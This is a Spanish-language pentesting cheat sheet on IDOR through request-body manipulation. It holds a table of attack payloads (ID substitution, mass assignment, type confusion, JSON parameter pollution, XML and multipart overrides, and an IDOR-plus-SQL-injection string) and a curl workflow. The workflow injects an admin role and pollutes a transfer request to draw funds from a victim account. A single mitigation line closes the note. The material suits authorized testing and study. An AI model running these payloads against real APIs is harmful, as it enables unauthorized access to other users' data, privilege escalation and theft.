---
aliases:
tags:
  - vuln/idor
  - technique/discovery
  - asset/api
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[BOLA - IDOR]]"
---
# IDOR - Manipulación del Cuerpo de la Petición

---

## Cheatsheet

| **Body modificado** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `{"doc_id": 106, "title": "Nota"}` | Edición/lectura de doc ajeno | Sustitución directa de ID en JSON. |
| `{"name": "Alice", "user_id": 106}` | Inyección de campo extra que backend acepta sin validar | Mass Assignment chained con IDOR. |
| `{"account_id": "106"}` o `{"account_id": [106]}` | Type confusion — string/array bypasea validación strict-int | Backend con type juggling laxo. |
| `{"id": [105, 106]}` | Array payload — validación checkea solo `[0]`, ORM aplica a todos | API con `WHERE id IN (...)` directo. |
| `{"id": 105, "id": 106}` | JSON parameter pollution — parser retiene primero/último según lib | Express + bodyParser ≠ Java Jackson en parsing. |
| `<user><id>106</id></user>` | XML cuando filtro solo cubre JSON | Endpoints multi-content-type. |
| `Content-Disposition: form-data; name="user_id"\r\n\r\n106` | Override de ID via multipart hidden field | Formularios profile/upload. |
| `{"id":105,"target_id":106}` | Endpoint admite "actor + target" sin verificar relación | Acciones admin disfrazadas como user. |
| `{"id": "1' OR '1'='1"}` | IDOR + SQLi combo | Backend pasa ID a query sin parametrización. |
^idor-cuerpo

### Workflow

```bash
# 1. Capturar PUT/PATCH/POST original
ORIG='{"doc_id": 105, "title": "Mi nota"}'

# 2. Probar sustitución directa
curl -X PUT https://target/api/doc \
  -H 'Cookie: session=USER_A' \
  -H 'Content-Type: application/json' \
  -d '{"doc_id": 106, "title": "Mi nota"}'

# 3. Mass Assignment + IDOR — injectar campos no esperados
curl -X POST https://target/api/profile \
  -H 'Cookie: session=USER_A' \
  -H 'Content-Type: application/json' \
  -d '{"name":"Alice","email":"a@a.com","user_id":1,"role":"admin"}'

# 4. Type juggling con array
for payload in '"106"' '[106]' '{"id":106}' '1.06e2' '0x6a'; do
  curl -s -X POST https://target/api/get \
    -H 'Content-Type: application/json' \
    -d "{\"account_id\": $payload}" | head -c 200
done

# 5. JSON pollution — primer/último wins
curl -X POST https://target/api/transfer \
  -H 'Content-Type: application/json' \
  --data-raw '{"from":"acc_A","to":"acc_A","from":"acc_VICTIM"}'
```

### Mitigación

Extraer identidad del JWT verificado server-side, **no** del body. DTO estricto que ignora campos no declarados (`@JsonIgnoreProperties(ignoreUnknown=true)` + lista blanca explícita).

---
